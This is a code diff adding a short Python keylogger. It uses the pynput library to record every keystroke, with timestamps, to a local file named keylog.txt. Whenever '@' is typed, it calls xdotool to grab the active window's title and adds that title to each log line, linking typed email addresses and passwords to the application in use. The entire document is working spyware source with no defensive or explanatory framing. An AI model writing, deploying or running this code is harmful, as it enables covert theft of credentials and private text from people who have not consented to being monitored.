@@ -1,0 +1,29 @@
+from pynput.keyboard import Key, Listener
+import logging
+import os
+
+# base format + output file
+fmt = "%(asctime)s - %(message)s"
+filename = "keylog.txt"
+
+# initial logging setup
+logging.basicConfig(filename=filename, level=logging.INFO, format=fmt, force=True)
+
+def on_press(key):
+    # turn the pressed key into a printable string
+    text = key.char if getattr(key, "char", None) else str(key)
+
+    # when '@' is typed, capture the active window title and update the log format
+    if getattr(key, "char", "") == "@":
+        try:
+            window_title = os.popen("xdotool getactivewindow getwindowname").read().strip()
+        except Exception:
+            window_title = "Unknown Window"
+        new_fmt = f"%(asctime)s - [{window_title}] - %(message)s"
+        logging.basicConfig(filename=filename, level=logging.INFO, format=new_fmt, force=True)
+        logging.info("@")
+    else:
+        logging.info(text)
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
